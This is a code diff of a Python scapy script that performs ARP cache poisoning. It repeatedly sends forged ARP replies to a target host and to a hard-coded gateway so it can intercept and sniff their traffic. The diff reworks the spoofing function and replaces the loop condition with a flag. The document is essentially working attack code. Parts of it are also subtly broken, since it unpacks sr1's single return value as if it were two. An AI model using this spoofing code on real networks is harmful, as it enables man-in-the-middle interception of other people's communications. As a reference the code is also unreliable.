@@ -1,9 +1,10 @@
 from scapy.layers.l2 import *
 from scapy.sendrecv import send, sr1
 
+var = True
+
 def spoofarpcache(targetip, targetmac, sourceip):
-	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
-	results, unans = sr1(spoofed, verbose= False)
+	results, unans= sr1(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac))
 	print(results)
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
@@ -28,7 +29,7 @@ def SingleSniffing(targetip):
 		gatewaymac = getmacbyip(conf.route.route("10.3.2.254")[2])
 		try:
 			print("Sending spoofed ARP responses")
-			while True:
+			while var:
 				print("hello")
 				spoofarpcache(targetip, targetmac, gatewayip)
 				spoofarpcache(gatewayip, gatewaymac, targetip)
